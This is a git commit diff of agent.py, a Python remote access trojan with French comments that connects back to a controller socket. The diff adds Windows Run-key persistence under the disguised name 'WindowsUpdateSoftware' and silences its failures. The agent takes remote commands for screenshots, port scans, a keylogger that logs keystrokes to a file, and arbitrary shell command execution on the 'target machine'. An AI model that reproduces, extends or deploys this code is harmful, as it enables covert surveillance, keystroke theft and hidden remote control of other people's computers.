2a44026a52aa661daf4d12e905158641cf3c245d
Maureen Drouard <151353727+maureeend@users.noreply.github.com>
2024-11-27 08:42:51 +0100

    Update agent.py

--- agent.py
+++ agent.py
@@ -1,26 +1,66 @@
 import socket
 import subprocess
-import sys
+import os
 import winreg as reg
 from PIL import ImageGrab
-from pynput import keyboard
+from pynput.keyboard import Listener
 
 ip_add = "127.0.0.1"
 port = 3280
 
 # Persistance
 def persistance():
-    script_path = sys.argv[0]
-    registry_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    chemin_script = os.path.abspath(__file__)
+    cle = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    valeur = "WindowsUpdateSoftware"
 
-    key = reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key, 0, reg.KEY_WRITE)
-    reg.SetValueEx(key, "agent.py", 0, reg.REG_SZ, script_path)
-    reg.CloseKey(key)
+    reg.CreateKey(reg.HKEY_CURRENT_USER, cle)
+    registre = reg.OpenKey(reg.HKEY_CURRENT_USER, cle, 0, reg.KEY_WRITE)
+    reg.SetValueEx(registre, valeur, 0, reg.REG_SZ, chemin_script)
+    reg.CloseKey(registre)
+
 
 # Lance l'agent
 def start_agent(s):
-    s.connect((ip_add, port))
-    data_socket(s)
+    while True:
+        s.connect((ip_add, port))  # Tentative de connexion
+        data_socket(s)  # Commence à recevoir et envoyer des données
+        break
+
+# Recoie et envoie des données
+def data_socket(s):
+    while True:
+        request = s.recv(1024)
+        command = request.decode("utf-8")
+
+        if command == "capture":
+            screenshot(s)
+
+        elif command.startswith("scan"):
+            try:
+                _, ip, port_range = command.split()
+                result = scan_port(ip, port_range)
+                s.send(result.encode("utf-8"))
+            except ValueError:
+                # Si la commande est mal formée, envoyer un message d'erreur au serveur
+                s.send(b"Invalid scan command. Use: scan <ip> <start_port>-<end_port>\n")
+
+        elif command == "keylogger":
+            start_keylogger(s)
+
+        elif command == "help":
+            help_text = """
+Commandes disponibles :
+    - capture : Prendre une capture d'écran de la machine cible.
+    - scan <ip> <start_port>-<end_port> : Scanner les ports de l'adresse IP donnée dans la plage de ports spécifiée.
+    - keylogger : Lancer le keylogger et écouter les frappes de touches sur la machine cible.
+    - stop : Arrêter l'agent sur la machine cible.
+"""
+            s.send(help_text.encode("utf-8"))
+            
+        else: 
+            execute_command(s, command)
+
 
 # Execute la commande
 def execute_command(s, command):
@@ -57,51 +97,25 @@ def scan_port(ip, port_range):
                 results.append(f"Port {port} is closed")
     return "\n".join(results) 
 
-# Envoie les frappes au serveur 
-def send_keypress(s, key):
-    if hasattr(key, 'char') and key.char:
-        s.send(key.char.encode())
-    else:
-        s.send(str(key).encode())
-
-# touche presse
-def press(s, key):
-    send_keypress(s, key)
-
-# Recoie et envoie des données
-def data_socket(s):
-    while True:
-        request = s.recv(1024)
-        command = request.decode("utf-8")
-
-        if command == "capture":
-            screenshot(s)
-
-        elif command.startswith("scan"):
-            try:
-                _, ip, port_range = command.split()
-                result = scan_port(ip, port_range)
-                s.send(result.encode("utf-8"))
-            except ValueError:
-                # Si la commande est mal formée, envoyer un message d'erreur au serveur
-                s.send(b"Invalid scan command. Use: scan <ip> <start_port>-<end_port>\n")
-
-        elif command == "keylogger":
-            start_keylogger(s)
-        else: 
-            execute_command(s, command)
-
-# Demarre le keylogger et envoie les key
+# Demarre le keylogger et envoie les keys
 def start_keylogger(s):
-    with keyboard.Listener(on_press=lambda key: press(s, key)) as listener:
+    
+    keylogger_log = "keylogger.txt"
+
+    def press(touche):
+        with open(keylogger_log, "a") as f:
+            f.write(f"{touche}\n")
+
+    with Listener(on_press=press) as listener:
         listener.join()
+
 
 if __name__ == "__main__":
     
-    persistance()
+    try:
+        persistance()
+    except:
+        pass 
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     start_agent(s)
-
-
-        
